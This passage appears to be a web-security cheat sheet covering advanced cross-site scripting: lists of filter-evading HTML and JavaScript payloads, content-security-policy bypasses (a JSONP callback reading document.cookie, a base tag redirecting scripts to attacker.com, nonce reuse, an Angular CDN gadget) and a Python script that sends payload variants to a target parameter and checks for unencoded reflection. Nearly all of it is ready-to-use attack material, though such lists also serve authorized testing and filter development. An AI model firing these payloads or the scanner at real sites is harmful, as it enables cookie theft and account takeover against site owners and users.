---

## Advanced XSS Bypass Payloads

When basic payloads like `<script>alert(1)</script>` and `<img onerror>` are blocked:

### SVG / MathML Context Payloads
```html
<svg><animatetransform onbegin=alert(1)>
<svg><set onbegin=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
<svg><a><rect width=100% height=100% /><animate attributeName=href values=javascript:alert(1) />
<svg/onload=alert(1)>
```

### Uncommon Event Handlers
```html
<!-- ontoggle — works without user interaction if open attribute set -->
<details open ontoggle=alert(1)>
<details/open/ontoggle=alert(1)>

<!-- onfocus + autofocus — fires automatically -->
<input onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>

<!-- onbegin (SVG animation) — fires when animation starts -->
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

<!-- body events -->
<body onload=alert(1)>
<body onpageshow=alert(1)>
<body onfocus=alert(1)>

<!-- marquee events -->
<marquee onstart=alert(1)>
<marquee onfinish=alert(1)>
<marquee loop=1 onfinish=alert(1)>test</marquee>

<!-- video/audio onerror -->
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<video src=x onerror=alert(1)>

<!-- Other auto-firing -->
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<iframe src="javascript:alert(1)">
<iframe srcdoc="<script>alert(1)</script>">
```

### Tag and Attribute Bypass Variations
```html
<!-- Mixed case -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- No space required -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- Backtick instead of parentheses -->
<svg onload=alert`1`>

<!-- Using constructor -->
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="self['ale'+'rt'](1)">
<img src=x onerror="top['al'+'ert'](1)">

<!-- Unicode escapes in JS -->
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<!-- Without alert keyword -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=x onerror=print()>
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>

<!-- Using throw -->
<img src=x onerror="window.onerror=alert;throw 1">

<!-- URL encoding in href -->
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)">click</a>

<!-- Data URI -->
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

---

## CSP Bypass Patterns

### JSONP Callback Exploitation
If CSP allows a domain that serves JSONP endpoints:
```html
<!-- CSP: script-src 'self' https://accounts.google.com -->
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>

<!-- CSP: script-src cdn.example.com -->
<script src="https://cdn.example.com/jsonp?callback=alert(document.cookie)//"></script>

<!-- Common JSONP endpoints to look for -->
<!-- /api/jsonp?callback=X, /widget?cb=X, /search?format=jsonp&callback=X -->
```

### Base Tag Hijacking
If CSP uses `nonce` or `hash` but doesn't restrict `base-uri`:
```html
<!-- Redirect relative script loads to attacker server -->
<base href="https://attacker.com/">
<!-- Now any <script src="/app.js"> loads from attacker.com/app.js -->
```

### unsafe-eval Exploitation
```html
<!-- If CSP allows 'unsafe-eval' -->
<script>eval('ale'+'rt(1)')</script>
<script>new Function('alert(1)')()</script>
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',1000)</script>
```

### unsafe-inline Exploitation
```html
<!-- If CSP allows 'unsafe-inline' -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<!-- Inline scripts and event handlers both work -->
```

### Nonce Reuse / Prediction
```html
<!-- If nonce is static or predictable -->
<script nonce="KNOWN_NONCE">alert(1)</script>

<!-- If nonce is in the page source, extract and reuse it -->
<!-- Find: <script nonce="abc123"> in page, use same nonce -->
```

### DOM-Based CSP Bypass
```html
<!-- CSP only restricts HTTP responses, not DOM manipulation -->
<!-- If you can inject into a script that uses eval/innerHTML: -->
<div id=x data-payload="alert(1)"></div>
<!-- Then if existing script does: eval(document.getElementById('x').dataset.payload) -->
```

### CDN-Based Bypass
```html
<!-- If CSP allows a CDN that hosts angular/vue/react -->
<!-- CSP: script-src cdn.jsdelivr.net -->
<script src="https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js"></script>
<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
```

---

## Automated XSS Detection Script

```python
#!/usr/bin/env python3
"""Automated XSS detection — test multiple payload variants with reflection detection."""
import requests
import sys
import urllib.parse
import re
import html
import random
import string

def generate_canary():
    """Generate unique canary string to detect reflection."""
    return ''.join(random.choices(string.ascii_lowercase, k=8))

def test_xss(url, param, method="GET", cookies=None):
    """Test a parameter for XSS across multiple payload variants."""
    results = []
    headers = {"User-Agent": "Mozilla/5.0"}
    canary = generate_canary()

    # Phase 1: Test basic reflection
    resp = _send(url, param, canary, method, cookies, headers)
    if resp and canary not in resp.text:
        print(f"  [-] No reflection detected for parameter '{param}'")
        return results

    print(f"  [*] Reflection confirmed for '{param}', testing payloads...")

    # Determine reflection context
    context = _detect_context(resp.text, canary) if resp else "unknown"
    print(f"  [*] Reflection context: {context}")

    # Phase 2: Test payloads by priority
    payloads = [
        # Basic HTML injection
        ("img onerror", f'<img src=x onerror=alert("{canary}")>'),
        ("svg onload", f'<svg onload=alert("{canary}")>'),
        ("details ontoggle", f'<details open ontoggle=alert("{canary}")>'),

        # Breaking out of attributes
        ("attr breakout dq", f'"><img src=x onerror=alert("{canary}")>'),
        ("attr breakout sq", f"'><img src=x onerror=alert('{canary}')>"),
        ("attr breakout event", f'" onfocus=alert("{canary}") autofocus="'),

        # Breaking out of script
        ("script breakout", f'</script><img src=x onerror=alert("{canary}")>'),

        # JavaScript context
        ("js string breakout", f"';alert('{canary}');//"),
        ("js template literal", f"${{alert('{canary}')}}"),

        # SVG context
        ("svg animate", f'<svg><animate onbegin=alert("{canary}") attributeName=x dur=1s>'),
        ("svg animatetransform", f'<svg><animatetransform onbegin=alert("{canary}")>'),

        # Event handlers (filter bypass)
        ("input autofocus", f'<input onfocus=alert("{canary}") autofocus>'),
        ("select autofocus", f'<select onfocus=alert("{canary}") autofocus>'),
        ("textarea autofocus", f'<textarea onfocus=alert("{canary}") autofocus>'),
        ("body onload", f'<body onload=alert("{canary}")>'),
        ("marquee onstart", f'<marquee onstart=alert("{canary}")>'),

        # Encoding bypass
        ("href javascript", f'javascript:alert("{canary}")'),
        ("data uri", f'data:text/html,<script>alert("{canary}")</script>'),
    ]

    for name, payload in payloads:
        resp = _send(url, param, payload, method, cookies, headers)
        if resp:
            # Check if payload is reflected unencoded
            if payload in resp.text or canary in resp.text:
                # Check for key characters being unencoded
                if '<' in resp.text and '>' in resp.text:
                    has_angle = True
                else:
                    has_angle = False

                # More precise: check the specific payload
                encoded_check = html.escape(payload)
                if payload in resp.text and encoded_check not in resp.text:
                    results.append(f"[REFLECTED] {name}: Payload reflected UNENCODED")
                elif payload in resp.text:
                    results.append(f"[PARTIAL] {name}: Payload reflected (check encoding)")

    return results

def _detect_context(response_text, canary):
    """Detect where the canary is reflected in the HTML."""
    idx = response_text.find(canary)
    if idx < 0:
        return "not-found"

    before = response_text[max(0, idx-100):idx]

    if '<script' in before.lower() and '</script>' not in before.lower():
        return "javascript"
    if re.search(r'["\']$', before.rstrip()):
        return "attribute"
    if re.search(r'<\w+[^>]*$', before):
        return "tag-attribute"
    return "html-body"

def _send(url, param, value, method, cookies, headers):
    """Send request with payload."""
    try:
        if method.upper() == "GET":
            sep = "&" if "?" in url else "?"
            full_url = f"{url}{sep}{param}={urllib.parse.quote(value)}"
            return requests.get(full_url, headers=headers, cookies=cookies,
                              timeout=10, allow_redirects=True)
        else:
            return requests.post(url, data={param: value}, headers=headers,
                               cookies=cookies, timeout=10, allow_redirects=True)
    except Exception:
        return None

if __name__ == "__main__":
    target = sys.argv[1]  # e.g., http://target.com/search
    param = sys.argv[2]   # e.g., q
    method = sys.argv[3] if len(sys.argv) > 3 else "GET"
    print(f"[*] Testing XSS on {target} parameter '{param}' via {method}")
    findings = test_xss(target, param, method)
    for f in findings:
        print(f"  [+] {f}")
    if not findings:
        print("  [-] No XSS detected (payloads were encoded or filtered)")
```
